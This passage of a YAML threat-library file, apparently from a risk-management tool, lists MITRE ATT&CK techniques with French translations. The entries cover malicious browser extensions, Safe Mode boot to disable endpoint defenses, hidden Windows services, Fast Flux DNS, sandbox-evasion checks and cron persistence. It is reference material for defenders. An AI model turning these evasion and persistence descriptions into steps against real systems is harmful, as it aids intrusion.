          \ extensions ou plugins de navigateur sont de petits programmes qui peuvent\
          \ ajouter des fonctionnalit\xE9s et personnaliser certains aspects des navigateurs\
          \ internet. Ils peuvent \xEAtre install\xE9s directement via un fichier\
          \ local ou une URL personnalis\xE9e ou via la boutique d'applications d'un\
          \ navigateur \u2013 une plateforme en ligne officielle o\xF9 les utilisateurs\
          \ peuvent parcourir, installer et g\xE9rer des extensions pour un navigateur\
          \ web sp\xE9cifique. Les extensions h\xE9ritent g\xE9n\xE9ralement des autorisations\
          \ pr\xE9c\xE9demment accord\xE9es au navigateur. (Citation : extension du\
          \ navigateur Wikip\xE9dia)(Citation : D\xE9finition des extensions Chrome)\
          \  Les extensions malveillantes peuvent \xEAtre install\xE9es dans un navigateur\
          \ via des t\xE9l\xE9chargements malveillants de boutiques d'applications\
          \ se faisant passer pour des extensions l\xE9gitimes, par ing\xE9nierie\
          \ sociale, ou par un adversaire ayant d\xE9j\xE0 compromis un syst\xE8me.\
          \ La s\xE9curit\xE9 peut \xEAtre limit\xE9e sur les boutiques d'applications\
          \ navigateurs, il peut donc ne pas \xEAtre difficile pour des extensions\
          \ malveillantes de contourner les scanners automatis\xE9s. (Citation : Num\xE9\
          ros d'extension Chrome malveillants) Selon le navigateur, les adversaires\
          \ peuvent aussi manipuler l'URL de mise \xE0 jour d'une extension pour installer\
          \ des mises \xE0 jour depuis un serveur contr\xF4l\xE9 par l'adversaire\
          \ ou manipuler le fichier de configuration mobile pour installer silencieusement\
          \ des extensions suppl\xE9mentaires. \n\nLes adversaires peuvent abuser\
          \ de la fa\xE7on dont les navigateurs bas\xE9s sur Chrome chargent les extensions\
          \ en modifiant ou en rempla\xE7ant les fichiers Pr\xE9f\xE9rences et/ou\
          \ Pr\xE9f\xE9rences S\xE9curis\xE9es pour installer silencieusement des\
          \ extensions malveillantes. Lorsque le navigateur ne fonctionne pas, les\
          \ adversaires peuvent modifier ces fichiers, s'assurant que l'extension\
          \ est charg\xE9e, accorde les permissions souhait\xE9es et persiste lors\
          \ des sessions du navigateur. Cette m\xE9thode ne n\xE9cessite pas le consentement\
          \ de l'utilisateur et les extensions sont charg\xE9es silencieusement en\
          \ arri\xE8re-plan depuis le disque ou depuis la boutique de confiance du\
          \ navigateur. (Citation : Pulsedive)  Avant macOS 11, les adversaires pouvaient\
          \ installer silencieusement des extensions de navigateur via la ligne de\
          \ commande en utilisant l'outil <code>profiles</code> pour installer des\
          \ fichiers malveillants <code>.mobileconfig</code>. Dans macOS 11+, l'utilisation\
          \ de l'outil <code>profils</code> ne peut plus installer de profils de configuration\
          \ ; cependant, les fichiers <code>.mobileconfig</code> peuvent \xEAtre implant\xE9\
          s et install\xE9s avec l'interaction utilisateur. (Citation : extensions\
          \ xorrior chrome macOS)  Une fois l'extension install\xE9e, elle peut naviguer\
          \ sur des sites web en arri\xE8re-plan, voler toutes les informations saisies\
          \ par un utilisateur dans un navigateur (y compris les identifiants), et\
          \ \xEAtre utilis\xE9e comme installateur pour un RAT afin de persister.\
          \ (Citation : Chrome Extension Crypto Miner)(Citation : Extensions Chrome\
          \ ICEBRG)(Citation : L'extension Google Chrome de banquier vole des cr\xE9\
          dits)(Citation : Extension Chrome Catch All) \n\nIl y a \xE9galement eu\
          \ des cas de botnets utilisant une porte d\xE9rob\xE9e persistante via des\
          \ extensions Chrome malveillantes pour [Command and Control](https://attack.mitre.org/tactics/TA0011).\
          \ (Citation : Stantinko Botnet)(Citation : Malware C2 de l'extension Chrome)\
          \ Les adversaires peuvent \xE9galement utiliser des extensions de navigateur\
          \ pour modifier les permissions et composants du navigateur, les param\xE8\
          tres de confidentialit\xE9 et d'autres contr\xF4les de s\xE9curit\xE9 pour\
          \ [Defense Evasion](https://attack.mitre.org/tactics/TA0005). (Citation\
          \ : Fr\xE8re Renard de Browers)(Citation : Navigateur Adrozek) https://attack.mitre.org/techniques/T1176/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562.009
    ref_id: T1562.009
    name: Safe Mode Boot
    description: 'Adversaries may abuse Windows safe mode to disable endpoint defenses.
      Safe mode starts up the Windows operating system with a limited set of drivers
      and services. Third-party security software such as endpoint detection and response
      (EDR) tools may not start after booting Windows in safe mode. There are two
      versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible
      to start additional services after a safe mode boot.(Citation: Microsoft Safe
      Mode)(Citation: Sophos Snatch Ransomware 2019)


      Adversaries may abuse safe mode to disable endpoint defenses that may not start
      with a limited boot. Hosts can be forced into safe mode after the next reboot
      via modifications to Boot Configuration Data (BCD) stores, which are files that
      manage boot application settings.(Citation: Microsoft bcdedit 2021)


      Adversaries may also add their malicious applications to the list of minimal
      services that start in safe mode by modifying relevant Registry values (i.e.
      [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component
      Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may
      also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware
      2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus
      MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)

      https://attack.mitre.org/techniques/T1562/009'
    translations:
      fr:
        name: "D\xE9marrage en mode sans \xE9chec"
        description: "Les adversaires peuvent abuser du mode sans \xE9chec de Windows\
          \ pour d\xE9sactiver les d\xE9fenses des points de terminaison. Le mode\
          \ sans \xE9chec lance le syst\xE8me d'exploitation Windows avec un ensemble\
          \ limit\xE9 de pilotes et de services. Les logiciels de s\xE9curit\xE9 tiers,\
          \ tels que les outils de d\xE9tection et de r\xE9ponse de terminaux (EDR),\
          \ peuvent ne pas d\xE9marrer apr\xE8s le d\xE9marrage de Windows en mode\
          \ sans \xE9chec. Il existe deux versions du mode sans \xE9chec : le mode\
          \ sans \xE9chec et le mode sans \xE9chec avec r\xE9seau. Il est possible\
          \ de lancer des services suppl\xE9mentaires apr\xE8s un d\xE9marrage en\
          \ mode sans \xE9chec. (Citation : Mode sans \xE9chec Microsoft)(Citation\
          \ : Sophos Snatch Ransomware 2019)\n\nLes adversaires peuvent abuser du\
          \ mode sans \xE9chec pour d\xE9sactiver les d\xE9fenses de points de terminaison\
          \ qui ne d\xE9marrent pas par un d\xE9marrage limit\xE9. Les h\xF4tes peuvent\
          \ \xEAtre forc\xE9s en mode sans \xE9chec apr\xE8s le prochain red\xE9marrage\
          \ via des modifications des m\xE9moires de donn\xE9es de configuration de\
          \ d\xE9marrage (BCD), qui sont des fichiers g\xE9rant les param\xE8tres\
          \ de l'application de d\xE9marrage. (Citation : Microsoft bcdedit 2021)\n\
          \nLes adversaires peuvent \xE9galement ajouter leurs applications malveillantes\
          \ \xE0 la liste des services minimaux qui commencent en mode sans \xE9chec\
          \ en modifiant les valeurs pertinentes du Registre (c'est-\xE0-dire [Modifier\
          \ le Registre](https://attack.mitre.org/techniques/T1112)). Les objets malveillants\
          \ [Component Object Model](https://attack.mitre.org/techniques/T1559/001)\
          \ (COM) peuvent \xE9galement \xEAtre enregistr\xE9s et charg\xE9s en mode\
          \ sans \xE9chec. (Citation : Sophos Snatch Ransomware 2019)(Citation : CyberArk\
          \ Labs Mode Sans \xC9chec 2016)(Citation : Cybereason Nocturnus MedusaLocker\
          \ 2020)(Citation : BleepingComputer REvil 2021) https://attack.mitre.org/techniques/T1562/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.005
    ref_id: T1542.005
    name: TFTP Boot
    description: 'Adversaries may abuse netbooting to load an unauthorized network
      device operating system from a Trivial File Transfer Protocol (TFTP) server.
      TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled
      network device images from a centralized management server. Netbooting is one
      option in the boot sequence and can be used to centralize, manage, and control
      device images.


      Adversaries may manipulate the configuration on the network device specifying
      use of a malicious TFTP server, which may be used in conjunction with [Modify
      System Image](https://attack.mitre.org/techniques/T1601) to load a modified
      image on device startup or reset. The unauthorized image allows adversaries
      to modify device configuration, add malicious capabilities to the device, and
      introduce backdoors to maintain control of the network device while minimizing
      detection through use of a standard functionality. This technique is similar
      to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result
      in the network device running a modified image. (Citation: Cisco Blog Legacy
      Device Attacks)

      https://attack.mitre.org/techniques/T1542/005'
    translations:
      fr:
        name: "D\xE9marrage TFTP"
        description: "Les adversaires peuvent abuser du netboot pour charger un syst\xE8\
          me d'exploitation de p\xE9riph\xE9rique r\xE9seau non autoris\xE9 depuis\
          \ un serveur du Trivial File Transfer Protocol (TFTP). Le d\xE9marrage TFTP\
          \ (netbooting) est couramment utilis\xE9 par les administrateurs r\xE9seau\
          \ pour charger des images de dispositifs r\xE9seau contr\xF4l\xE9es par\
          \ la configuration depuis un serveur de gestion centralis\xE9. Le netboot\
          \ est une option dans la s\xE9quence de d\xE9marrage et peut \xEAtre utilis\xE9\
          \ pour centraliser, g\xE9rer et contr\xF4ler les images des appareils.\n\
          \nLes adversaires peuvent manipuler la configuration sur l'appareil r\xE9\
          seau en sp\xE9cifiant l'utilisation d'un serveur TFTP malveillant, qui peut\
          \ \xEAtre utilis\xE9 conjointement avec [Modifier l'image syst\xE8me](https://attack.mitre.org/techniques/T1601)\
          \ pour charger une image modifi\xE9e au d\xE9marrage ou \xE0 la r\xE9initialisation\
          \ de l'appareil. L'image non autoris\xE9e permet aux adversaires de modifier\
          \ la configuration des appareils, d'ajouter des capacit\xE9s malveillantes\
          \ \xE0 l'appareil et d'introduire des portes d\xE9rob\xE9es pour maintenir\
          \ le contr\xF4le du dispositif r\xE9seau tout en minimisant la d\xE9tection\
          \ gr\xE2ce \xE0 une fonctionnalit\xE9 standard. Cette technique est similaire\
          \ \xE0 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) et peut\
          \ entra\xEEner l'ex\xE9cution d'une image modifi\xE9e par le dispositif\
          \ r\xE9seau. (Citation : Attaques d'appareils h\xE9rit\xE9s du blog Cisco\
          \ https://attack.mitre.org/techniques/T1542/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543.003
    ref_id: T1543.003
    name: Windows Service
    description: "Adversaries may create or modify Windows services to repeatedly\
      \ execute malicious payloads as part of persistence. When Windows boots up,\
      \ it starts programs or applications called services that perform background\
      \ system functions.(Citation: TechNet Services) Windows service configuration\
      \ information, including the file path to the service's executable or recovery\
      \ programs/commands, is stored in the Windows Registry.\n\nAdversaries may install\
      \ a new service or modify an existing service to execute at startup in order\
      \ to persist on a system. Service configurations can be set or modified using\
      \ system utilities (such as sc.exe), by directly modifying the Registry, or\
      \ by interacting directly with the Windows API. \n\nAdversaries may also use\
      \ services to install and execute malicious drivers. For example, after dropping\
      \ a driver file (ex: `.sys`) to disk, the payload can be loaded and registered\
      \ via [Native API](https://attack.mitre.org/techniques/T1106) functions such\
      \ as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()`\
      \ and `ZwSetValueKey()`), by creating the required service Registry values (i.e.\
      \ [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using\
      \ command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet\
      \ Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42\
      \ AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s\
      \ to hide the presence of malicious activity on a system. Adversaries may also\
      \ load a signed yet vulnerable driver onto a compromised machine (known as \"\
      Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege\
      \ Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole\
      \ June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created\
      \ with administrator privileges but are executed under SYSTEM privileges, so\
      \ an adversary may also use a service to escalate privileges. Adversaries may\
      \ also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\
      \nTo make detection analysis more challenging, malicious services may also incorporate\
      \ [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004)\
      \ (ex: using a service and/or payload name related to a legitimate OS or benign\
      \ software component). Adversaries may also create \u2018hidden\u2019 services\
      \ (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example\
      \ by using the `sc sdset` command to set service permissions via the Service\
      \ Descriptor Definition Language (SDDL). This may hide a Windows service from\
      \ the view of standard service enumeration methods such as `Get-Service`, `sc\
      \ query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)\nhttps://attack.mitre.org/techniques/T1543/003"
    translations:
      fr:
        name: Windows Service
        description: "Les adversaires peuvent cr\xE9er ou modifier des services Windows\
          \ pour ex\xE9cuter \xE0 plusieurs reprises des charges utiles malveillantes\
          \ dans le cadre de la persistance. Lorsque Windows d\xE9marre, il lance\
          \ des programmes ou applications appel\xE9s services qui effectuent des\
          \ fonctions syst\xE8me en arri\xE8re-plan. (Citation : TechNet Services)\
          \ Les informations de configuration des services Windows, y compris le chemin\
          \ du fichier vers l'ex\xE9cutable du service ou les programmes/commandes\
          \ de r\xE9cup\xE9ration, sont stock\xE9es dans le registre Windows.\n\n\
          Les adversaires peuvent installer un nouveau service ou modifier un service\
          \ existant pour l'ex\xE9cuter au d\xE9marrage afin de persister sur un syst\xE8\
          me. Les configurations de service peuvent \xEAtre configur\xE9es ou modifi\xE9\
          es \xE0 l'aide d'utilitaires syst\xE8me (comme sc.exe), en modifiant directement\
          \ le Registre, ou en interagissant directement avec l'API Windows. \n\n\
          Les adversaires peuvent \xE9galement utiliser des services pour installer\
          \ et ex\xE9cuter des pilotes malveillants. Par exemple, apr\xE8s avoir d\xE9\
          pos\xE9 un fichier de pilote (ex : '.sys') sur le disque, la charge utile\
          \ peut \xEAtre charg\xE9e et enregistr\xE9e via des fonctions [Native API](https://attack.mitre.org/techniques/T1106)\
          \ telles que 'CreateServiceW()' (ou manuellement via des fonctions telles\
          \ que 'ZwLoadDriver()' et 'ZwSetValueKey()'), en cr\xE9ant les valeurs requises\
          \ du registre de service (c'est-\xE0-dire [Modifier le registre](https://attack.mitre.org/techniques/T1112)),\
          \ ou en utilisant des utilitaires en ligne de commande tels que 'PnPUtil.exe'.\
          \ (Citation : Dossier Symantec W.32 Stuxnet)(Citation : Crowdstrike DriveSlayer\
          \ f\xE9vrier 2022)(Citation : Unit42 AcidBox juin 2020) Les adversaires\
          \ peuvent utiliser ces pilotes sous forme de [Rootkit](https://attack.mitre.org/techniques/T1014)\
          \ pour dissimuler la pr\xE9sence d'activit\xE9s malveillantes sur un syst\xE8\
          me. Les adversaires peuvent \xE9galement charger un pilote sign\xE9 mais\
          \ vuln\xE9rable sur une machine compromise (connue sous le nom de \xAB Bring\
          \ Your Own Vulnerable Driver \xBB (BYOVD)) dans le cadre de [Exploitation\
          \ for Privilege Escalaation](https://attack.mitre.org/techniques/T1068).\
          \ (Citation : ESET InvisiMole juin 2020)(Citation : Unit42 AcidBox juin\
          \ 2020)\n\nLes services peuvent \xEAtre cr\xE9\xE9s avec des privil\xE8\
          ges administrateur mais sont ex\xE9cut\xE9s selon les privil\xE8ges SYSTEM,\
          \ donc un adversaire peut aussi utiliser un service pour escalader des privil\xE8\
          ges. Les adversaires peuvent \xE9galement lancer directement les services\
          \ via [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\
          \nPour rendre l'analyse de d\xE9tection plus difficile, les services malveillants\
          \ peuvent \xE9galement incorporer [Masquerade Task ou Service](https://attack.mitre.org/techniques/T1036/004)\
          \ (ex. : utiliser un nom de service et/ou de charge utile li\xE9 \xE0 un\
          \ syst\xE8me l\xE9gitime ou \xE0 un composant logiciel b\xE9nin). Les adversaires\
          \ peuvent \xE9galement cr\xE9er des services \xAB cach\xE9s \xBB (c'est-\xE0\
          -dire [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), par\
          \ exemple en utilisant la commande 'sc sdset' pour d\xE9finir les permissions\
          \ de service via le Service Descriptor Definition Language (SDDL). Cela\
          \ peut dissimuler un service Windows aux m\xE9thodes standard d'\xE9num\xE9\
          ration de services telles que \xAB Get-Service \xBB, \xAB sc query \xBB\
          \ et \xAB services.exe \xBB. (Citation : SANS 1)(Citation : SANS 2)https://attack.mitre.org/techniques/T1543/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1568.001
    ref_id: T1568.001
    name: Fast Flux DNS
    description: 'Adversaries may use Fast Flux DNS to hide a command and control
      channel behind an array of rapidly changing IP addresses linked to a single
      domain resolution. This technique uses a fully qualified domain name, with multiple
      IP addresses assigned to it which are swapped with high frequency, using a combination
      of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource
      record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast
      Flux - Welivesecurity)


      The simplest, "single-flux" method, involves registering and de-registering
      an addresses as part of the DNS A (address) record list for a single DNS name.
      These registrations have a five-minute average lifespan, resulting in a constant
      shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)


      In contrast, the "double-flux" method registers and de-registers an address
      as part of the DNS Name Server record list for the DNS zone, providing additional
      resilience for the connection. With double-flux additional hosts can act as
      a proxy to the C2 host, further insulating the true source of the C2 channel.

      https://attack.mitre.org/techniques/T1568/001'
    translations:
      fr:
        name: DNS Flux rapide
        description: "Les adversaires peuvent utiliser Fast Flux DNS pour dissimuler\
          \ un canal de commande et de contr\xF4le derri\xE8re un tableau d'adresses\
          \ IP changeantes rapidement li\xE9es \xE0 une seule r\xE9solution de domaine.\
          \ Cette technique utilise un nom de domaine enti\xE8rement qualifi\xE9,\
          \ avec plusieurs adresses IP attribu\xE9es qui sont \xE9chang\xE9es \xE0\
          \ grande fr\xE9quence, en combinant un adressage IP en round robin et un\
          \ court Time-To-Live (TTL) pour un enregistrement de ressources DNS. (Citation\
          \ : MehtaFastFluxPt1)(Citation : MehtaFastFluxPt2)(Citation : Flux rapide\
          \ - Welivesecurity)\n\nLa m\xE9thode la plus simple, \xAB flux unique \xBB\
          , consiste \xE0 enregistrer et d\xE9sinscrire une adresse dans la liste\
          \ d'enregistrements DNS A (adresse) pour un nom DNS unique. Ces enregistrements\
          \ ont une dur\xE9e de vie moyenne de cinq minutes, ce qui entra\xEEne un\
          \ m\xE9lange constant de la r\xE9solution des adresses IP. (Citation : Flux\
          \ rapide - Welivesecurity)\n\nEn revanche, la m\xE9thode \xAB double-flux\
          \ \xBB enregistre et d\xE9sinscrit une adresse dans la liste d'enregistrements\
          \ du serveur de noms DNS pour la zone DNS, offrant ainsi une r\xE9silience\
          \ suppl\xE9mentaire \xE0 la connexion. Avec le double flux, des h\xF4tes\
          \ suppl\xE9mentaires peuvent agir comme un substitut de l'h\xF4te C2, isolant\
          \ davantage la v\xE9ritable source du canal C2.https\_://attack.mitre.org/techniques/T1568/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1497.001
    ref_id: T1497.001
    name: System Checks
    description: "Adversaries may employ various system checks to detect and avoid\
      \ virtualization and analysis environments. This may include changing behaviors\
      \ based on the results of checks for the presence of artifacts indicative of\
      \ a virtual machine environment (VME) or sandbox. If the adversary detects a\
      \ VME, they may alter their malware to disengage from the victim or conceal\
      \ the core functions of the implant. They may also search for VME artifacts\
      \ before dropping secondary or additional payloads. Adversaries may use the\
      \ information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)\
      \ during automated discovery to shape follow-on behaviors.(Citation: Deloitte\
      \ Environment Awareness)\n\nSpecific checks will vary based on the target and/or\
      \ adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047),\
      \ [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information\
      \ Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012)\
      \ to obtain system information and search for VME artifacts. Adversaries may\
      \ search for VME artifacts in memory, processes, file system, hardware, and/or\
      \ the Registry. Adversaries may use scripting to automate these checks  into\
      \ one script and then have the program exit if it determines the system to be\
      \ a virtual environment. \n\nChecks could include generic system properties\
      \ such as host/domain name and samples of network traffic. Adversaries may also\
      \ check the network adapters addresses, CPU core count, and available memory/drive\
      \ size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)\
      \ to check if it was saved in a folder or file with unexpected or even analysis-related\
      \ naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks\
      \ may enumerate services running that are unique to these applications, installed\
      \ programs on the system, manufacturer/product fields for strings relating to\
      \ virtual machine applications, and VME-specific hardware/processor instructions.(Citation:\
      \ McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also\
      \ use a special I/O port to send commands and receive output. \n \nHardware\
      \ checks, such as the presence of the fan, temperature, and audio devices, could\
      \ also be used to gather evidence that can be indicative a virtual environment.\
      \ Adversaries may also query for specific readings from these devices.(Citation:\
      \ Unit 42 OilRig Sept 2018)\nhttps://attack.mitre.org/techniques/T1497/001"
    translations:
      fr:
        name: "Contr\xF4les syst\xE8me"
        description: "Les adversaires peuvent employer diverses v\xE9rifications syst\xE8\
          me pour d\xE9tecter et \xE9viter les environnements de virtualisation et\
          \ d'analyse. Cela peut inclure des changements de comportements bas\xE9\
          s sur les r\xE9sultats des v\xE9rifications de la pr\xE9sence d'artefacts\
          \ indiquant un environnement de machine virtuelle (VME) ou un bac \xE0 sable.\
          \ Si l'adversaire d\xE9tecte un VME, il peut modifier son malware pour se\
          \ d\xE9connecter de la victime ou dissimuler les fonctions principales de\
          \ l'implant. Ils peuvent \xE9galement rechercher des art\xE9facts VME avant\
          \ de larguer des charges utiles secondaires ou suppl\xE9mentaires. Les adversaires\
          \ peuvent utiliser les informations apprises via la [Virtualisation/\xC9\
          vasion bac \xE0 sable](https://attack.mitre.org/techniques/T1497) lors de\
          \ la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements suivants.\
          \ (Citation : Sensibilisation environnementale de Deloitte)\n\nLes v\xE9\
          rifications sp\xE9cifiques varient selon la cible et/ou l'adversaire, mais\
          \ peuvent impliquer des comportements tels que [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047),\
          \ [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information\
          \ Discovery](https://attack.mitre.org/techniques/T1082) et [Query Registry](https://attack.mitre.org/techniques/T1012)\
          \ pour obtenir des informations syst\xE8me et rechercher des artefacts VME.\
          \ Les adversaires peuvent rechercher des artefacts VME dans la m\xE9moire,\
          \ les processus, le syst\xE8me de fichiers, le mat\xE9riel et/ou le Registre.\
          \ Les adversaires peuvent utiliser des scripts pour automatiser ces v\xE9\
          rifications en un seul script, puis faire sortir le programme s'il d\xE9\
          termine que le syst\xE8me est un environnement virtuel. \n\nLes v\xE9rifications\
          \ peuvent inclure des propri\xE9t\xE9s syst\xE8me g\xE9n\xE9riques telles\
          \ que le nom h\xF4te/domaine et des exemples de trafic r\xE9seau. Les adversaires\
          \ peuvent \xE9galement v\xE9rifier les adresses des adaptateurs r\xE9seau,\
          \ le nombre de c\u0153urs du CPU et la taille de la m\xE9moire/disque disponible.\
          \ Une fois ex\xE9cut\xE9, le malware peut \xE9galement utiliser [File and\
          \ Directory Discovery](https://attack.mitre.org/techniques/T1083) pour v\xE9\
          rifier s'il a \xE9t\xE9 sauvegard\xE9 dans un dossier ou un fichier contenant\
          \ des artefacts de nommage inattendus ou m\xEAme li\xE9s \xE0 l'analyse,\
          \ tels que \xAB malware \xBB, \xAB sample \xBB ou \xAB hash \xBB.\n\nD'autres\
          \ v\xE9rifications courantes peuvent \xE9num\xE9rer les services ex\xE9\
          cut\xE9s uniques \xE0 ces applications, les programmes install\xE9s sur\
          \ le syst\xE8me, les champs fabricant/produit pour les cha\xEEnes de caract\xE8\
          res li\xE9es aux applications de machines virtuelles, ainsi que les instructions\
          \ mat\xE9rielles/processeurs sp\xE9cifiques \xE0 chaque VME. (Citation :\
          \ McAfee Virtual janvier 2017) Dans des applications comme VMWare, les adversaires\
          \ peuvent \xE9galement utiliser un port d'E/S sp\xE9cial pour envoyer des\
          \ commandes et recevoir des sorties.  Des v\xE9rifications mat\xE9rielles,\
          \ telles que la pr\xE9sence du ventilateur, la temp\xE9rature et les dispositifs\
          \ audio, pourraient \xE9galement \xEAtre utilis\xE9es pour recueillir des\
          \ preuves indiquant un environnement virtuel. Les adversaires peuvent \xE9\
          galement solliciter des relev\xE9s sp\xE9cifiques de ces appareils. (Citation\
          \ : Plate-forme p\xE9troli\xE8re Unit 42 sept. 2018)https://attack.mitre.org/techniques/T1497/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.003
    ref_id: T1053.003
    name: Cron
    description: 'Adversaries may abuse the <code>cron</code> utility to perform task
      scheduling for initial or recurring execution of malicious code.(Citation: 20
      macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based
      job scheduler for Unix-like operating systems.  The <code> crontab</code> file
      contains the schedule of cron entries to be run and the specified times for
      execution. Any <code>crontab</code> files are stored in operating system-specific
      file paths.


      An adversary may use <code>cron</code> in Linux or Unix environments to execute
      programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003).
      In ESXi environments, cron jobs must be created directly via the crontab file
      (e.g., `/var/spool/cron/crontabs/root`).(Citation: CloudSEK ESXiArgs 2023)

      https://attack.mitre.org/techniques/T1053/003'
    translations:
      fr:
        name: Cron
        description: "Les adversaires peuvent abuser de l'utilitaire <code>cron</code>\
          \ pour effectuer la planification des t\xE2ches lors de l'ex\xE9cution initiale\
          \ ou r\xE9currente de code malveillant. (Citation : 20 outils et techniques\
          \ courants sur macOS) L'utilitaire <code>cron</code> est un planificateur\
          \ de t\xE2ches bas\xE9 sur le temps pour les syst\xE8mes d'exploitation\
          \ de type Unix.  Le fichier <code> crontab</code> contient le planning des\
          \ entr\xE9es cron \xE0 ex\xE9cuter ainsi que les d\xE9lais sp\xE9cifi\xE9\
          s pour l'ex\xE9cution. Tous les fichiers <code>crontab</code> sont stock\xE9\
          s dans des chemins de fichiers sp\xE9cifiques au syst\xE8me d'exploitation.\n\
          \nUn adversaire peut utiliser <code>cron</code> dans des environnements\
          \ Linux ou Unix pour ex\xE9cuter des programmes au d\xE9marrage du syst\xE8\
          me ou sur une base planifi\xE9e pour [Persistence](https://attack.mitre.org/tactics/TA0003).\
          \ Dans les environnements ESXi, les t\xE2ches cron doivent \xEAtre cr\xE9\
          \xE9es directement via le fichier crontab (par exemple, \xAB /var/spool/cron/crontabs/root\
          \ \xBB). (Citation : CloudSEK ESXiArgs 2023)https://attack.mitre.org/techniques/T1053/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1069.002
    ref_id: T1069.002
    name: Domain Groups
    description: 'Adversaries may attempt to find domain-level groups and permission
      settings. The knowledge of domain-level permission groups can help adversaries
      determine which groups exist and which users belong to a particular group. Adversaries
      may use this information to determine which users have elevated permissions,
      such as domain administrators.


      Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039)
      utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code>
      on Linux can list domain-level groups.

      https://attack.mitre.org/techniques/T1069/002'
    translations:
      fr:
        name: Groupes de domaines
        description: "Les adversaires peuvent tenter de trouver des groupes au niveau\
          \ du domaine et des param\xE8tres de permission. La connaissance des groupes\
          \ de permissions au niveau du domaine peut aider les adversaires \xE0 d\xE9\
          terminer quels groupes existent et quels utilisateurs appartiennent \xE0\
          \ un groupe particulier. Les adversaires peuvent utiliser ces informations\
          \ pour d\xE9terminer quels utilisateurs ont des permissions \xE9lev\xE9\
          es, comme les administrateurs de domaine.\n\nDes commandes telles que <code>net\
          \ group /domain</code> de l'utilitaire [Net](https://attack.mitre.org/software/S0039),\
          \ <code>dscacheutil -q group</code> sur macOS, et <code>ldapsearch</code>\
          \ sous Linux peuvent lister des groupes au niveau du domaine.https\_://attack.mitre.org/techniques/T1069/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.006
    ref_id: T1588.006
    name: Vulnerabilities
    description: 'Adversaries may acquire information about vulnerabilities that can
      be used during targeting. A vulnerability is a weakness in computer hardware
      or software that can, potentially, be exploited by an adversary to cause unintended
      or unanticipated behavior to occur. Adversaries may find vulnerability information
      by searching open databases or gaining access to closed vulnerability databases.(Citation:
      National Vulnerability Database)


      An adversary may monitor vulnerability disclosures/databases to understand the
      state of existing, as well as newly discovered, vulnerabilities. There is usually
      a delay between when a vulnerability is discovered and when it is made public.
      An adversary may target the systems of those known to conduct vulnerability
      research (including commercial vendors). Knowledge of a vulnerability may cause
      an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005))
      or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).

      https://attack.mitre.org/techniques/T1588/006'
    translations:
      fr:
        name: "Vuln\xE9rabilit\xE9s"
        description: "Les adversaires peuvent acqu\xE9rir des informations sur des\
          \ vuln\xE9rabilit\xE9s qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Une vuln\xE9rabilit\xE9 est une faiblesse du mat\xE9riel ou du logiciel\
          \ informatique qui peut, potentiellement, \xEAtre exploit\xE9e par un adversaire\
          \ pour provoquer des comportements inattendus ou inattendus. Les adversaires\
          \ peuvent trouver des informations sur les vuln\xE9rabilit\xE9s en consultant\
          \ dans des bases de donn\xE9es ouvertes ou en acc\xE9dant \xE0 des bases\
          \ de donn\xE9es ferm\xE9es. (Citation : Base de donn\xE9es nationale des\
          \ vuln\xE9rabilit\xE9s)\n\nUn adversaire peut surveiller les divulgations/bases\
          \ de donn\xE9es de vuln\xE9rabilit\xE9s afin de comprendre l'\xE9tat des\
          \ vuln\xE9rabilit\xE9s existantes ainsi que des nouvelles d\xE9couvertes.\
          \ Il y a g\xE9n\xE9ralement un d\xE9lai entre la d\xE9couverte d'une vuln\xE9\
          rabilit\xE9 et celle o\xF9 elle est rendue publique. Un adversaire peut\
